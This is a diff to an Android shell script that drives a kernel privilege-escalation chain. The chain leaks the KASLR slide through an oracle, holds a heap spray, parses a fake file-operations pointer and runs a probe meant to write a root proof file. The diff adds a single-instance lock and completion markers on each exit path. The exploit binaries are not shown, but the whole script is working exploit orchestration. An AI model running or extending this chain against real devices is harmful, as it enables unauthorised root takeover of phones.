@@ -4,7 +4,15 @@
 # and proof to /data/local/tmp/ROOTED.
 D=/data/local/tmp
 L=$D/rw_chain.log
+rm -f $D/CHAIN_DONE
 log() { echo "$(date +%H:%M:%S) $*" >> $L; }
+
+# single-instance: never run two chains (concurrent walks KP)
+if pgrep -f gl_rw >/dev/null 2>&1 || pgrep -f rw_chain >/dev/null 2>&1; then
+  log "chain abort: another instance running"
+  touch $D/CHAIN_DONE
+  exit 1
+fi
 
 log "chain start"
 
@@ -17,7 +25,7 @@ log "O-fire exit=$?"
 # ---- 2) decode (device-side) ----
 SLIDE=$($D/slide_dec)
 log "slide=$SLIDE"
-case "$SLIDE" in 0x*) ;; *) log "ORACLE MISS — chain ends"; exit 1;; esac
+case "$SLIDE" in 0x*) ;; *) log "ORACLE MISS — chain ends"; touch $D/CHAIN_DONE; exit 1;; esac
 
 # ---- 3) N-fire: swap + HOLD, detached ----
 rm -f $D/gl_out.txt
@@ -36,13 +44,14 @@ while [ $i -lt 120 ]; do
   if ! kill -0 $NPID 2>/dev/null; then
     # process gone: did it hold or exit?
     grep -q 'SWAP_HOLD\|HOLD: spray live' $D/gl_out.txt 2>/dev/null && { HOLD=1; break; }
-    log "N-fire exited early"; break
+    log "N-fire exited early"; touch $D/CHAIN_DONE; exit 1
   fi
   sleep 2
   i=$((i+1))
 done
 if [ $HOLD -ne 1 ]; then
   log "NO HOLD (walk miss) — chain ends"
+  touch $D/CHAIN_DONE
   exit 1
 fi
 log "WINDOW OPEN"
@@ -51,7 +60,7 @@ log "WINDOW OPEN"
 FF=$(grep -o 'fake_fops (ffffff[0-9a-f]*)' $D/gl_out.txt | tail -1 | grep -o 'ffffff[0-9a-f]*')
 GLPID=$(grep -o 'pid=[0-9]*' $D/gl_out.txt | head -1 | cut -d= -f2)
 log "probe: ff=$FF slide=$SLIDE glpid=$GLPID"
-case "$FF" in ffffff*) ;; *) log "no fake_fops parsed"; exit 1;; esac
+case "$FF" in ffffff*) ;; *) log "no fake_fops parsed"; touch $D/CHAIN_DONE; exit 1;; esac
 
 $D/swap_probe $FF $SLIDE $GLPID > $D/probe_out.txt 2>&1
 PRC=$?
@@ -60,4 +69,5 @@ log "$(tail -8 $D/probe_out.txt | tr '\\n' '|')"
 if [ -f $D/ROOTED ]; then
   log "*** ROOT PROOF WRITTEN ***"
 fi
+touch $D/CHAIN_DONE
 exit $PRC
